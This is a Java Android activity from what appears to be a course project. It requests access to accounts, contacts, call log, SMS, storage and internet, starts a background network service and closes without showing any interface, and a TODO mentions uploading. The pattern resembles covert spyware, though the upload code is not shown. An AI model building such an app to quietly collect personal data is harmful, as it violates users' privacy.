package yalimov.course;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import android.util.Log;

import yalimov.course.service.NetService;

import static android.Manifest.permission.GET_ACCOUNTS;
import static android.Manifest.permission.INTERNET;
import static android.Manifest.permission.READ_CALL_LOG;
import static android.Manifest.permission.READ_CONTACTS;
import static android.Manifest.permission.READ_EXTERNAL_STORAGE;
import static android.Manifest.permission.READ_SMS;
import static yalimov.course.Common.DEBUG_TAG;

// TODO: Uploading, Getting, Saving state, Searching free networks.

public class Main extends Activity
{
    @Override
    public void onCreate(Bundle savedInstanceState)
    {
        super.onCreate(savedInstanceState);
        try
        {
            new PermissionGetter(this).GetPermissions(new String[] {GET_ACCOUNTS, INTERNET, READ_CONTACTS, READ_CALL_LOG, READ_EXTERNAL_STORAGE, READ_SMS});
            Intent intent = new Intent(this, NetService.class);
            startService(intent);
        }
        catch (Exception ex)
        {
            Log.d(DEBUG_TAG, "Error setting service");
        }
        finish();
    }

    @Override
    public void onDestroy()
    {
        super.onDestroy();
    }
}
